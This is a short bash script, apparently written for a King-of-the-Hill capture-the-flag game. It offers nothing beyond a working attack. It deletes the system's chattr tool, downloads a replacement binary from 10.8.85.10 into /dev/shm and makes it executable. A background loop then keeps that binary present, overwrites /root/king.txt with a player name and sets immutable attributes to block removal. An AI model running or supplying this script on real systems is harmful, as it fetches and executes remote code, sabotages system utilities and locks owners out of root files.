rm $(which chattr)
cd /dev/shm
wget 10.8.85.10/chattr
mv chattr asd
chmod +x asd
while true; do
     if ls -l /dev/shm/asd
          then
               echo OK
          else
               cd /dev/shm
          	wget 10.8.85.10/chattr
          	mv chattr /dev/shm/asd
          	chmod +x /dev/shm/asd
          	echo DONE
     fi
     /dev/shm/asd -ia /root
     /dev/shm/asd -ia /root/king.txt 2>/dev/null
     echo -n "lomarkomar" >| /root/king.txt 2>/dev/null
     /dev/shm/asd +ia /root/king.txt 2>/dev/null
     /dev/shm/asd +ia /root
done &
